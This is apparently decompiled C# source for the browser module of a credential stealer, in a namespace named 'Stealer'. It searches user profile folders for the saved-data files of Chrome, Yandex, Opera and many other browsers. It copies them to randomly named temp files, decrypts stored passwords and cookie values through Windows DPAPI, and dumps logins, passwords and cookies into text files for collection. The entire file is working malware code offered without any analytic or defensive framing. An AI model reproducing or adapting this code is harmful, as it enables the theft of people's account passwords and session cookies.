using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using file;
using White;

namespace Stealer
{
	// Token: 0x02000016 RID: 22
	internal class Browsers
	{
		// Token: 0x06000047 RID: 71 RVA: 0x00006D89 File Offset: 0x00004F89
		public static void Steal(string path)
		{
			Directory.CreateDirectory(path);
			Browsers.GetPasswords();
			Browsers.GetCookies();
		}

		// Token: 0x06000048 RID: 72
		[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool CryptUnprotectData(ref Browsers.DataBlob pCipherText, ref string pszDescription, ref Browsers.DataBlob pEntropy, IntPtr pReserved, ref Browsers.CryptprotectPromptstruct pPrompt, int dwFlags, ref Browsers.DataBlob pPlainText);

		// Token: 0x06000049 RID: 73 RVA: 0x00006DA0 File Offset: 0x00004FA0
		private static byte[] DecryptBrowsers(byte[] cipherTextBytes, byte[] entropyBytes = null)
		{
			Browsers.DataBlob dataBlob = default(Browsers.DataBlob);
			Browsers.DataBlob dataBlob2 = default(Browsers.DataBlob);
			Browsers.DataBlob dataBlob3 = default(Browsers.DataBlob);
			Browsers.CryptprotectPromptstruct cryptprotectPromptstruct = new Browsers.CryptprotectPromptstruct
			{
				cbSize = Marshal.SizeOf(typeof(Browsers.CryptprotectPromptstruct)),
				dwPromptFlags = 0,
				hwndApp = IntPtr.Zero,
				szPrompt = null
			};
			string empty = string.Empty;
			try
			{
				try
				{
					bool flag = cipherTextBytes == null;
					if (flag)
					{
						cipherTextBytes = new byte[0];
					}
					dataBlob2.pbData = Marshal.AllocHGlobal(cipherTextBytes.Length);
					dataBlob2.cbData = cipherTextBytes.Length;
					Marshal.Copy(cipherTextBytes, 0, dataBlob2.pbData, cipherTextBytes.Length);
				}
				catch (Exception)
				{
				}
				try
				{
					bool flag2 = entropyBytes == null;
					if (flag2)
					{
						entropyBytes = new byte[0];
					}
					dataBlob3.pbData = Marshal.AllocHGlobal(entropyBytes.Length);
					dataBlob3.cbData = entropyBytes.Length;
					Marshal.Copy(entropyBytes, 0, dataBlob3.pbData, entropyBytes.Length);
				}
				catch (Exception)
				{
				}
				Browsers.CryptUnprotectData(ref dataBlob2, ref empty, ref dataBlob3, IntPtr.Zero, ref cryptprotectPromptstruct, 1, ref dataBlob);
				byte[] array = new byte[dataBlob.cbData];
				Marshal.Copy(dataBlob.pbData, array, 0, dataBlob.cbData);
				return array;
			}
			catch (Exception)
			{
			}
			finally
			{
				bool flag3 = dataBlob.pbData != IntPtr.Zero;
				if (flag3)
				{
					Marshal.FreeHGlobal(dataBlob.pbData);
				}
				bool flag4 = dataBlob2.pbData != IntPtr.Zero;
				if (flag4)
				{
					Marshal.FreeHGlobal(dataBlob2.pbData);
				}
				bool flag5 = dataBlob3.pbData != IntPtr.Zero;
				if (flag5)
				{
					Marshal.FreeHGlobal(dataBlob3.pbData);
				}
			}
			return new byte[0];
		}

		// Token: 0x0600004A RID: 74 RVA: 0x00006F94 File Offset: 0x00005194
		private static List<CookieData> FetchCookies(string basePath)
		{
			bool flag = !File.Exists(basePath);
			List<CookieData> result;
			if (flag)
			{
				result = null;
			}
			else
			{
				try
				{
					string text = Path.GetTempPath() + "/" + Helper.RandomString() + ".fv";
					bool flag2 = File.Exists(text);
					if (flag2)
					{
						File.Delete(text);
					}
					File.Copy(basePath, text, true);
					SQL sql = new SQL(text);
					List<CookieData> list = new List<CookieData>();
					sql.ReadTable("cookies");
					int num = 0;
					for (;;)
					{
						bool flag3 = num >= sql.GetRowCount();
						if (flag3)
						{
							break;
						}
						try
						{
							string text2 = string.Empty;
							try
							{
								text2 = Encoding.UTF8.GetString(Browsers.DecryptBrowsers(Encoding.Default.GetBytes(sql.GetValue(num, 12)), null));
							}
							catch (Exception)
							{
							}
							bool flag4 = text2 != "";
							if (flag4)
							{
								CookieData item = new CookieData
								{
									host_key = sql.GetValue(num, 1),
									name = sql.GetValue(num, 2),
									path = sql.GetValue(num, 4),
									expires_utc = sql.GetValue(num, 5),
									secure = sql.GetValue(num, 6),
									value = text2
								};
								list.Add(item);
							}
						}
						catch (Exception)
						{
						}
						num++;
					}
					File.Delete(text);
					result = list;
				}
				catch (Exception)
				{
					result = null;
				}
			}
			return result;
		}

		// Token: 0x0600004B RID: 75 RVA: 0x0000715C File Offset: 0x0000535C
		private static void GetCookies()
		{
			StreamWriter streamWriter = new StreamWriter("C:\\ProgramData\\debug.txt", true);
			Directory.CreateDirectory(Program.path + "\\Browsers\\Cookies");
			List<CookieData> list = new List<CookieData>();
			File.WriteAllText(Program.path + "\\Browsers\\CookiesList.txt", "");
			string environmentVariable = Environment.GetEnvironmentVariable("LocalAppData");
			string[] array = new string[]
			{
				environmentVariable + "\\Google\\Chrome\\User Data\\Default\\Cookies",
				environmentVariable + "\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies",
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Cookies",
				environmentVariable + "\\Kometa\\User Data\\Default\\Cookies",
				environmentVariable + "\\Orbitum\\User Data\\Default\\Cookies",
				environmentVariable + "\\Comodo\\Dragon\\User Data\\Default\\Cookies",
				environmentVariable + "\\Amigo\\User\\User Data\\Default\\Cookies",
				environmentVariable + "\\Torch\\User Data\\Default\\Cookies"
			};
			for (int i = 0; i < array.Length; i++)
			{
				List<CookieData> list2 = Browsers.FetchCookies(array[i]);
				bool flag = list2 != null;
				if (flag)
				{
					try
					{
						string text = null;
						foreach (CookieData cookieData in list2)
						{
							text += cookieData.ToString();
						}
						File.WriteAllText(Program.path + string.Format("\\Browsers\\Cookies\\Cookies_{0}.txt", i), text);
						using (StreamWriter streamWriter2 = new StreamWriter(Program.path + "\\Browsers\\CookiesList.txt", true, Encoding.Default))
						{
							streamWriter2.WriteLine(array[i] + string.Format(" - Cookies_{0}.txt - Count: {1}", i, list2.Count));
						}
					}
					catch (Exception value)
					{
						Console.Write(value);
						Console.Read();
					}
				}
			}
		}

		// Token: 0x0600004C RID: 76 RVA: 0x00007370 File Offset: 0x00005570
		private static List<AutoFillData> GetAutoFill()
		{
			List<AutoFillData> list = new List<AutoFillData>();
			List<string> list2 = new List<string>();
			List<string> list3 = new List<string>
			{
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
			};
			List<string> list4 = new List<string>();
			foreach (string path in list3)
			{
				try
				{
					list4.AddRange(Directory.EnumerateDirectories(path));
				}
				catch
				{
				}
			}
			foreach (string path2 in list4)
			{
				try
				{
					list2.AddRange(Directory.EnumerateFiles(path2, "Login Data", SearchOption.AllDirectories));
					list2.AddRange(Directory.EnumerateFiles(path2, "Web Data", SearchOption.AllDirectories));
				}
				catch
				{
				}
			}
			string[] array = list2.ToArray();
			for (int i = 0; i < array.Length; i++)
			{
				List<AutoFillData> list5 = Browsers.FetchAutoFill(array[i]);
				bool flag = list5 != null;
				if (flag)
				{
					list.AddRange(list5);
				}
			}
			return list;
		}

		// Token: 0x0600004D RID: 77 RVA: 0x000074DC File Offset: 0x000056DC
		private static List<AutoFillData> FetchAutoFill(string basePath)
		{
			List<AutoFillData> result;
			try
			{
				string text = Path.GetTempPath() + "/" + Helper.RandomString() + ".fv";
				bool flag = File.Exists(text);
				if (flag)
				{
					File.Delete(text);
				}
				File.Copy(basePath, text, true);
				SQL sql = new SQL(text);
				List<AutoFillData> list = new List<AutoFillData>();
				sql.ReadTable("autofill");
				bool flag2 = sql.GetRowCount() == 65536;
				if (flag2)
				{
					result = null;
				}
				else
				{
					int num = 0;
					for (;;)
					{
						bool flag3 = num >= sql.GetRowCount();
						if (flag3)
						{
							break;
						}
						try
						{
							AutoFillData item = new AutoFillData
							{
								Name = sql.GetValue(num, 0),
								Value = sql.GetValue(num, 1)
							};
							list.Add(item);
						}
						catch (Exception)
						{
						}
						num++;
					}
					File.Delete(text);
					result = list;
				}
			}
			catch (Exception)
			{
				result = null;
			}
			return result;
		}

		// Token: 0x0600004E RID: 78 RVA: 0x000075E4 File Offset: 0x000057E4
		private static void GetPasswords()
		{
			StreamWriter streamWriter = new StreamWriter("C:\\ProgramData\\debug.txt", true);
			try
			{
				Directory.CreateDirectory(Program.path + "\\Browsers");
				List<LogPassData> list = new List<LogPassData>();
				List<string> list2 = new List<string>();
				List<string> list3 = new List<string>
				{
					Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
					Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
				};
				List<string> list4 = new List<string>();
				foreach (string path in list3)
				{
					try
					{
						list4.AddRange(Directory.EnumerateDirectories(path));
					}
					catch
					{
					}
				}
				foreach (string path2 in list4)
				{
					try
					{
						list2.AddRange(Directory.GetFiles(path2, "Login Data", SearchOption.AllDirectories));
						string[] files = Directory.GetFiles(path2, "Login Data", SearchOption.AllDirectories);
						foreach (string text in files)
						{
							try
							{
								bool flag = File.Exists(text);
								if (flag)
								{
									string program = "Unknown (" + text + ")";
									bool flag2 = text.Contains("Chrome");
									if (flag2)
									{
										program = "Google Chrome";
									}
									bool flag3 = text.Contains("Yandex");
									if (flag3)
									{
										program = "Yandex Browser";
									}
									bool flag4 = text.Contains("Orbitum");
									if (flag4)
									{
										program = "Orbitum Browser";
									}
									bool flag5 = text.Contains("Opera");
									if (flag5)
									{
										program = "Opera Browser";
									}
									bool flag6 = text.Contains("Amigo");
									if (flag6)
									{
										program = "Amigo Browser";
									}
									bool flag7 = text.Contains("Torch");
									if (flag7)
									{
										program = "Torch Browser";
									}
									bool flag8 = text.Contains("Comodo");
									if (flag8)
									{
										program = "Comodo Browser";
									}
									bool flag9 = text.Contains("CentBrowser");
									if (flag9)
									{
										program = "CentBrowser";
									}
									bool flag10 = text.Contains("Go!");
									if (flag10)
									{
										program = "Go!";
									}
									bool flag11 = text.Contains("uCozMedia");
									if (flag11)
									{
										program = "uCozMedia";
									}
									bool flag12 = text.Contains("Rockmelt");
									if (flag12)
									{
										program = "Rockmelt";
									}
									bool flag13 = text.Contains("Sleipnir");
									if (flag13)
									{
										program = "Sleipnir";
									}
									bool flag14 = text.Contains("SRWare Iron");
									if (flag14)
									{
										program = "SRWare Iron";
									}
									bool flag15 = text.Contains("Vivaldi");
									if (flag15)
									{
										program = "Vivaldi";
									}
									bool flag16 = text.Contains("Sputnik");
									if (flag16)
									{
										program = "Sputnik";
									}
									bool flag17 = text.Contains("Maxthon");
									if (flag17)
									{
										program = "Maxthon";
									}
									bool flag18 = text.Contains("AcWebBrowser");
									if (flag18)
									{
										program = "AcWebBrowser";
									}
									bool flag19 = text.Contains("Epic Browser");
									if (flag19)
									{
										program = "Epic Browser";
									}
									bool flag20 = text.Contains("MapleStudio");
									if (flag20)
									{
										program = "MapleStudio";
									}
									bool flag21 = text.Contains("BlackHawk");
									if (flag21)
									{
										program = "BlackHawk";
									}
									bool flag22 = text.Contains("Flock");
									if (flag22)
									{
										program = "Flock";
									}
									bool flag23 = text.Contains("CoolNovo");
									if (flag23)
									{
										program = "CoolNovo";
									}
									bool flag24 = text.Contains("Baidu Spark");
									if (flag24)
									{
										program = "Baidu Spark";
									}
									bool flag25 = text.Contains("Titan Browser");
									if (flag25)
									{
										program = "Titan Browser";
									}
									try
									{
										string text2 = Path.GetTempPath() + "/" + Helper.RandomString() + ".fv";
										bool flag26 = File.Exists(text2);
										if (flag26)
										{
											File.Delete(text2);
										}
										File.Copy(text, text2, true);
										SQL sql = new SQL(text2);
										bool flag27 = !sql.ReadTable("logins");
										if (flag27)
										{
											break;
										}
										int num = 0;
										for (;;)
										{
											try
											{
												bool flag28 = num >= sql.GetRowCount();
												if (flag28)
												{
													break;
												}
												try
												{
													string text3 = string.Empty;
													try
													{
														text3 = Encoding.UTF8.GetString(Browsers.DecryptBrowsers(Encoding.Default.GetBytes(sql.GetValue(num, 5)), null));
													}
													catch (Exception)
													{
													}
													bool flag29 = text3 != "";
													if (flag29)
													{
														LogPassData item = new LogPassData
														{
															Url = sql.GetValue(num, 1).Replace("https://", "").Replace("http://", ""),
															Login = sql.GetValue(num, 3),
															Password = text3,
															Program = program
														};
														list.Add(item);
													}
												}
												catch (Exception)
												{
												}
												num++;
											}
											catch
											{
											}
										}
										File.Delete(text2);
									}
									catch
									{
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					catch
					{
					}
				}
				string environmentVariable = Environment.GetEnvironmentVariable("LocalAppData");
				string text4 = "";
				foreach (LogPassData logPassData in list)
				{
					text4 += logPassData.ToString();
					try
					{
						string text5 = logPassData.Url.Contains("/") ? logPassData.Url.Split(new char[]
						{
							'/'
						})[0] : logPassData.Url;
					}
					catch (Exception value)
					{
						Console.Write(value);
					}
				}
				File.WriteAllText(Program.path + "\\Browsers\\Passwords.txt", (text4 != null) ? (text4 + "\n――――――――――――――――――――――――――――――――――――――――――――") : "");
			}
			catch (Exception ex2)
			{
			}
			streamWriter.Close();
		}

		// Token: 0x02000029 RID: 41
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct CryptprotectPromptstruct
		{
			// Token: 0x0400003D RID: 61
			public int cbSize;

			// Token: 0x0400003E RID: 62
			public int dwPromptFlags;

			// Token: 0x0400003F RID: 63
			public IntPtr hwndApp;

			// Token: 0x04000040 RID: 64
			public string szPrompt;
		}

		// Token: 0x0200002A RID: 42
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct DataBlob
		{
			// Token: 0x04000041 RID: 65
			public int cbData;

			// Token: 0x04000042 RID: 66
			public IntPtr pbData;
		}
	}
}
